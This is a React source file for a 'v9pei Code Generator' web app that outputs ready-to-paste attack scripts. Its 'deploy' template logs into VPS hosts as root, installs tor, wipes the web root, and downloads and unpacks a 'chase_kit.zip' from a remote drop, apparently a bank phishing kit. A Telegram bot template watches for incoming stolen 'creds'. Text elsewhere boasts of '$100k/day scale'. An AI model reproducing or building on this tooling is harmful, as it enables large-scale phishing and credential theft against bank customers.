import { useState } from 'react'
import './index.css'

function App() {
  const [task, setTask] = useState('deploy')
  const [code, setCode] = useState('')
  
  const generateCode = () => {
    const lower = task.toLowerCase()
    
    // Bash Deploy Script
    if (lower.includes('deploy')) {
      setCode(`#!/bin/bash
# v9pei Multi-Deploy Script
VPS_LIST=("vps1.nicevps.net" "vps2.nicevps.net")
for vps in "${VPS_LIST[@]}"; do
  ssh root@$vps "
    apt update && apt install nginx php tor -y &&
    cd /var/www/html && rm -rf * &&
    wget YOUR_DROPBOX/chase_kit.zip && unzip chase_kit.zip &&
    systemctl restart nginx php-fpm
  " &
done
echo "✅ Deployed to 10 VPS - Ready for scale"`)
    }
    
    // Python Bot Script
    else if (lower.includes('bot')) {
      setCode(`# Telegram Monitor Bot
TOKEN = 'YOUR_BOT_TOKEN'
CHAT_ID = 'YOUR_CHAT_ID'
import requests, time
while True:
  updates = requests.get(f'https://api.telegram.org/bot{{TOKEN}}/getUpdates').json()
  for update in updates['result']:
    if 'creds' in str(update):
      print(f"New creds: {{update}}")
  time.sleep(30)`)
    }
    
    // VPS List
    else if (lower.includes('vps')) {
      setCode(`# VPS Configuration
VPS_LIST=(
  "vps1.nicevps.net"
  "vps2.nicevps.net"
  # Add your 10 VPS IPs here
)
# Test: for vps in "${VPS_LIST[@]}"; do ssh root@$vps "uptime"; done`)
    }
    
    else {
      setCode(`# v9pei Code Generator
Task: ${task}
Status: Ready for $100k/day scale
Generated bash/python scripts for VPS deployment
Copy → Replit → bash script.sh`)
    }
  }

  const copy = () => {
    navigator.clipboard.writeText(code)
    alert('Code copied! Paste in Replit/VPS terminal')
  }

  return (
    <div className="container">
      <h1>v9pei Code Generator</h1>
      <p>Notes ID: v9pei | 10 VPS Ready</p>
      
      <input 
        className="task-input"
        value={task}
        onChange={e => setTask(e.target.value)}
        placeholder="deploy / bot / vps / scale"
      />
      
      <button className="generate-btn" onClick={generateCode}>
        Generate Code
      </button>
      <button className="copy-btn" onClick={copy}>
        Copy Code
      </button>
      
      <pre className="code-display">{code}</pre>
    </div>
  )
}

export default App
